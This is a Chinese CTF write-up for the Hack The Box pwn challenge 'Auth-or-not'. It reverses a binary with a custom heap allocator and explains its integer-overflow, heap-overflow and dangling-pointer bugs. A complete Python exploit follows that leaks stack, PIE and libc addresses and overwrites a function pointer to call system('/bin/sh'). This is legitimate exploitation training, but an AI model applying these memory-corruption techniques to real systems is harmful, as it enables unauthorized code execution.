# HTB Auth-or-not：一个自实现堆管理的pwn练习-先知社区

> **来源**: https://xz.aliyun.com/news/17036  
> **文章ID**: 17036

---

## 前言

对于自定义堆类的题目，不要急着去分析堆管理的实现细节，优先观察模拟的堆在内存中的样子，申请释放操作，从最基本的漏洞形式入手去分析，可能就会简单很多（本例我刚开始去分析堆管理过程了，后来发现完全没必要，徒增了很多工作量）

## 题目情况

Will u make this poetry possible?

```
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
    Debuginfo:  Yes
```

> 没给 libc 文件

## 逆向分析

### main

依然是菜单题，但是实现了自定义堆管理器，全程都使用自定义的堆来管理内存

```
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int result; // eax
  unsigned __int8 CustomHeap[14336]; // [rsp+0h] [rbp-3810h] BYREF
  __int64 limit; // [rsp+3800h] [rbp-10h] BYREF
  unsigned __int64 canary; // [rsp+3808h] [rbp-8h]

  canary = __readfsqword(0x28u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  memset(CustomHeap, 0, sizeof(CustomHeap));
  if ( !ta_init(CustomHeap, &limit, 0xAuLL, 0x10uLL, 8uLL) )
    return 0;
  puts("*** Welcome to DZONERZY authors editor v0.11.2 ***");
  while ( 2 )
  {
    switch ( print_menu() )
    {
      case 1uLL:
        add_author();                           // 整数溢出,堆溢出，潜在地址泄露，需要打印note的地方
        continue;
      case 2uLL:
        modify_author();
        continue;
      case 3uLL:
        print_author();                         // 会打印note，潜在用来地址泄露
        continue;
      case 4uLL:
        delete_author();
        continue;
      case 5uLL:
        puts("bye bye!");
        result = 0;
        break;
      default:
        continue;
    }
    return result;
  }
}
```

### add\_author

这里会填写一系列信息，ta\_alloc是自定义的内存申请，保存在了一个结构体里

```
void __cdecl add_author()
{
  volatile PAuthor v0; // rbx
  volatile PAuthor v1; // rbx
  size_t n256; // rdx
  unsigned __int64 i; // [rsp+0h] [rbp-20h]
  unsigned __int64 NoteSize; // [rsp+8h] [rbp-18h]

  for ( i = 0LL; ; ++i )                        // 10个
  {
    if ( i > 9 )
    {
      puts("MAX AUTHORS REACHED!");
      return;
    }
    if ( !authors[i] )
      break;
  }
  authors[i] = (volatile PAuthor)ta_alloc(0x38uLL);// 申请内存
  if ( !authors[i] )
  {
    printf("Invalid allocation!");
    exit(0);
  }
  authors[i]->Print = (tPrintNote)PrintNote;    // 函数指针，可能用来RCE？
  printf("Name: ");
  get_from_user(authors[i]->Name, 0x10uLL);     // 无溢出
  printf("Surname: ");
  get_from_user(authors[i]->Surname, 0x10uLL);
  printf("Age: ");
  v0 = authors[i];
  v0->Age = get_number();
  printf("Author Note size: ");
  NoteSize = get_number();
  if ( NoteSize )
  {
    v1 = authors[i];
    v1->Note = (char *)ta_alloc(NoteSize + 1);  // 再次申请
                                                // 整数溢出！！输入-1之后，+1变成0，而size很大
    if ( !authors[i]->Note )
    {
      printf("Invalid allocation!");
      exit(0);
    }
    printf("Note: ");
    if ( NoteSize > 0x100 )                     // size有限制
      n256 = 256LL;
    else
      n256 = NoteSize + 1;                      // =256时，这个大小是257
    get_from_user(authors[i]->Note, n256);      // 写入数据，堆溢出
  }
  printf("Author %llu added!

", i + 1);
}
```

这里的authors结构体，程序遗留了符号信息，结构体如下：

```
00000000 _Author         struc ; (sizeof=0x38, align=0x8, copyof_10)
00000000 Name            db 16 dup(?)
00000010 Surname         db 16 dup(?)
00000020 Note            dq ?                    ; offset
00000028 Age             dq ?
00000030 Print           dq ?                    ; offset
00000038 _Author         ends
```

其中，这里的Note是个指针，也是通过ta\_alloc申请的，申请大小可控，为输入的值NoteSize+1，如果输入-1则会返回一个无符号的-1，申请0大小内存，却可以写入数据，造成堆溢出漏洞

这里的Print是个函数指针，指向了一个用于打印信息的函数，后续可能我们可以用来RCE

### PrintNote

```
void __cdecl PrintNote(char *Note)
{
  printf("Note: [%s]
", Note);
}
```

### get\_from\_user

这里的get\_from\_user也有点问题，末尾不留00截断，如果存在print %s的操作，可以泄露出后面的内容

```
int __cdecl get_from_user(char *buffer, size_t size)
{
  size_t v3; // rax
  char c; // [rsp+1Bh] [rbp-15h] BYREF
  int fd; // [rsp+1Ch] [rbp-14h]
  size_t cnt; // [rsp+20h] [rbp-10h]
  unsigned __int64 v7; // [rsp+28h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  cnt = 0LL;
  if ( !buffer || !size )
    return 0;
  fd = 0;
  while ( read(fd, &c, 1uLL) == 1 && cnt < size - 1 )
  {
    if ( c == 10 )
      return 1;
    v3 = cnt++;
    buffer[v3] = c;                             // 无溢出，但是没有用00结尾，可能导致字符串被拼接后面的内容，导致信息泄露！
                                                // 需要找一个会打印note内容的地方
  }
  return 1;
}
```

### modify

修改3个字段，没啥用

```
void __cdecl modify_author()
{
  unsigned __int64 authorid; // [rsp+0h] [rbp-10h]
  PAuthor a; // [rsp+8h] [rbp-8h]

  do
  {
    printf("Author ID: ");
    authorid = get_number();
    putchar(10);
  }
  while ( authorid > 0xA );
  a = authors[authorid - 1];                    // id从1开始，1到10
  if ( a )
  {
    printf("Name: ");
    get_from_user(a->Name, 0x10uLL);
    printf("Surname: ");
    get_from_user(a->Surname, 0x11uLL);         // 修改3个字段的内容
    printf("Age: ");
    a->Age = get_number();
    putchar(10);
  }
  else
  {
    printf("Author %llu does not exists!

", authorid);
  }
}
```

### print\_author

这里通过结构体调用其中的Print函数了，可用于泄露地址

```
void __cdecl print_author()
{
  unsigned __int64 authorid; // [rsp+0h] [rbp-10h]
  PAuthor a; // [rsp+8h] [rbp-8h]

  do
  {
    printf("Author ID: ");
    authorid = get_number();
    putchar(10);
  }
  while ( authorid > 0xA );
  a = authors[authorid - 1];
  if ( a )                                      // 打印4个字段的内容
  {
    puts("----------------------");
    printf("Author %llu
", authorid);
    printf("Name: %s
", a->Name);
    printf("Surname: %s
", a->Surname);
    printf("Age: %llu
", a->Age);
    a->Print(a->Note);                          // 打印note
    puts("-----------------------");
    putchar(10);
  }
  else
  {
    printf("Author %llu does not exists!

", authorid);
  }
}
```

### delete\_author

这里是释放，但是只清空了结构体的指针，其中note的指针没有清空

```
void __cdecl delete_author()
{
  unsigned __int64 authorid; // [rsp+0h] [rbp-10h]
  PAuthor author; // [rsp+8h] [rbp-8h]

  do
  {
    printf("Author ID: ");
    authorid = get_number();
    putchar(10);
  }
  while ( authorid > 0xA );
  author = authors[authorid - 1];
  if ( author )
  {
    ta_free(author->Note);                      // 这个指针没清空，可能会UAF
    ta_free(author);
    authors[authorid - 1] = 0LL;                // 清空指针
    printf("Author %llu deleted!

", authorid);
  }
  else
  {
    printf("Author %llu does not exists!

", authorid);
  }
}
```

## 利用分析

首先申请2个看看：

```
# 1. fengshui
add("1"*16,"b"*16,24,-1,b"1111")
add("2"*16,"d"*16,24,24,b"s"*24)
```

此时的栈上的模拟堆：

```
22:0110│     0x7fff30589ee0 ◂— '111111111111111'
23:0118│     0x7fff30589ee8 ◂— 0x31313131313131 /* '1111111' */
24:0120│     0x7fff30589ef0 ◂— 'bbbbbbbbbbbbbbb'
25:0128│     0x7fff30589ef8 ◂— 0x62626262626262 /* 'bbbbbbb' */
26:0130│     0x7fff30589f00 —▸ 0x7fff30589f18 ◂— '222222222222222'
27:0138│     0x7fff30589f08 ◂— 0x18
28:0140│     0x7fff30589f10 —▸ 0x556249201219 (PrintNote) ◂— push rbp

29:0148│     0x7fff30589f18 ◂— '222222222222222'
2a:0150│     0x7fff30589f20 ◂— 0x32323232323232 /* '2222222' */
2b:0158│     0x7fff30589f28 ◂— 'ddddddddddddddd'
2c:0160│     0x7fff30589f30 ◂— 0x64646464646464 /* 'ddddddd' */
2d:0168│     0x7fff30589f38 —▸ 0x7fff30589f50 ◂— 'ssssssssssssssssssssssss'
2e:0170│     0x7fff30589f40 ◂— 0x18
2f:0178│     0x7fff30589f48 —▸ 0x556249201219 (PrintNote) ◂— push rbp
30:0180│     0x7fff30589f50 ◂— 'ssssssssssssssssssssssss'
31:0188│     0x7fff30589f58 ◂— 'ssssssssssssssss'
32:0190│     0x7fff30589f60 ◂— 'ssssssss'
```

可以看到，这里第一次申请的内存大小写入的-1，申请的值是0，申请出来的地址是0x7fff30589f18，这里的地址可控，但是然后被第二次申请的内容覆盖了

这意味着，如果释放了第一次的申请，然后再申请回来，就可以覆盖第二次申请的内容了，通过覆盖部分内容就可以泄露出地址，然后用覆盖的地址计算出来system函数地址，覆盖到print指针上，然后触发即可RCE

### 辅助函数

```
def cmd(i, prompt=b"Choice:"):
    sla(prompt, i)

def add(name:str,surname:str,age:int,sz:int,note:bytes):
    cmd('1')
    sa(b"Name: ",name.encode())
    sa(b"Surname: ",surname.encode())
    sla(b"Age: ",str(age).encode())
    sla(b"Note size: ",str(sz).encode())
    sla(b"Note: ",note)
    #......

def edit(id:int,name:str,surname:str,age:int):
    cmd('2')
    sla(b"ID: ",str(id).encode())
    sla(b"Name: ",name.encode())
    sla(b"Surname: ",surname.encode())
    sla(b"Age: ",str(age).encode())
    #......

def show(id:int):
    cmd('3')
    sla(b"ID: ",str(id).encode())
    #......

def dele(id:int):
    cmd('4')
    sla(b"ID: ",str(id).encode())
```

### leak stack&pie address

通过完整覆盖Name和Surname部分，紧挨着的Note指针就会被Print打印出来，通过调整指针的指向，还可以打印出来PrintNote函数地址，计算出pie地址

```
# 2. leak stack address 
dele(1)
add("1"*16,"b"*16,24,-1,cyclic(0x20))
show(2)

ru(cyclic(0x20))
stackleak = r(6)
stackleak = u64(stackleak.ljust(8,b'\x00'))
success(f"stackleak: {hex(stackleak)}")

# 3. leak pie address
dele(1)
add("1"*16,"b"*16,24,-1,cyclic(0x20)+pack(stackleak-8))
show(2)

ru(b"Note: [")
leak = r(6)
leak = u64(leak.ljust(8,b'\x00'))
success(f"leak: {hex(leak)}")
elf.address = leak -0x1219
```

### leak libc address

没有提供libc，意味着需要打印出部分符号的地址，去libc database查询libc信息

```
# 4. leak libc puts address
dele(1)
add("1"*16,"b"*16,24,-1,cyclic(0x20)+pack(elf.got.puts))
show(2)

ru(b"Note: [")
puts_leak = r(6)
puts_leak = u64(puts_leak.ljust(8,b'\x00'))
success(f"puts_leak: {hex(puts_leak)}")
```

查询结果一个一个试，最终是：

```
libc6_2.27-3ubuntu1.4_amd64
Download	Click to download
All Symbols	Click to download
BuildID	ce450eb01a5e5acc7ce7b8c2633b02cc1093339e
MD5	8ee8363b834ad2c65a05bd40c8e4623e
__libc_start_main_ret	0x21bf7
dup2	0x110a70
printf	0x64f70
puts	0x80aa0
read	0x110140
str_bin_sh	0x1b3e1a
system	0x4f550
write	0x110210
```

### RCE

覆盖Print指针来完成RCE，刚好Print函数的调用是一个字符串参数，是结构体的Note指针

```
# 5. search system address and construct call chain
libcbase = puts_leak - 0x80aa0
systemaddr = libcbase + 0x4f550
dele(1)
add("1"*16,"b"*16,24,-1,cyclic(0x20)+pack(stackleak) + pack(18)+pack(systemaddr) + b"/bin/sh\x00")
show(2)
```

## 完整exp

```
#!/usr/bin/env python3
from pwncli import *
cli_script()

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

def cmd(i, prompt=b"Choice:"):
    sla(prompt, i)

def add(name:str,surname:str,age:int,sz:int,note:bytes):
    cmd('1')
    sa(b"Name: ",name.encode())
    sa(b"Surname: ",surname.encode())
    sla(b"Age: ",str(age).encode())
    sla(b"Note size: ",str(sz).encode())
    sla(b"Note: ",note)
    #......

def edit(id:int,name:str,surname:str,age:int):
    cmd('2')
    sla(b"ID: ",str(id).encode())
    sla(b"Name: ",name.encode())
    sla(b"Surname: ",surname.encode())
    sla(b"Age: ",str(age).encode())
    #......

def show(id:int):
    cmd('3')
    sla(b"ID: ",str(id).encode())
    #......

def dele(id:int):
    cmd('4')
    sla(b"ID: ",str(id).encode())

# 1. fengshui
add("1"*16,"b"*16,24,-1,b"1111")
add("2"*16,"d"*16,24,24,b"s"*24)

# 2. leak stack address 
dele(1)
add("1"*16,"b"*16,24,-1,cyclic(0x20))
show(2)

ru(cyclic(0x20))
stackleak = r(6)
stackleak = u64(stackleak.ljust(8,b'\x00'))
success(f"stackleak: {hex(stackleak)}")

# 3. leak pie address
dele(1)
add("1"*16,"b"*16,24,-1,cyclic(0x20)+pack(stackleak-8))
show(2)

ru(b"Note: [")
leak = r(6)
leak = u64(leak.ljust(8,b'\x00'))
success(f"leak: {hex(leak)}")
elf.address = leak -0x1219

# 4. leak libc puts address
dele(1)
add("1"*16,"b"*16,24,-1,cyclic(0x20)+pack(elf.got.puts))
show(2)

ru(b"Note: [")
puts_leak = r(6)
puts_leak = u64(puts_leak.ljust(8,b'\x00'))
success(f"puts_leak: {hex(puts_leak)}")

# 5. search system address and construct call chain
libcbase = puts_leak - 0x80aa0
systemaddr = libcbase + 0x4f550
dele(1)
add("1"*16,"b"*16,24,-1,cyclic(0x20)+pack(stackleak) + pack(18)+pack(systemaddr) + b"/bin/sh\x00")
show(2)


log_code_base_addr(elf.address)
log_address("stack leak",stackleak)
log_address("leak libc puts",puts_leak)

ia()
```

## 参考资料

* [0] [Hack The Box :: Hack The Box](https://app.hackthebox.com/challenges/Auth-or-out/walkthroughs)
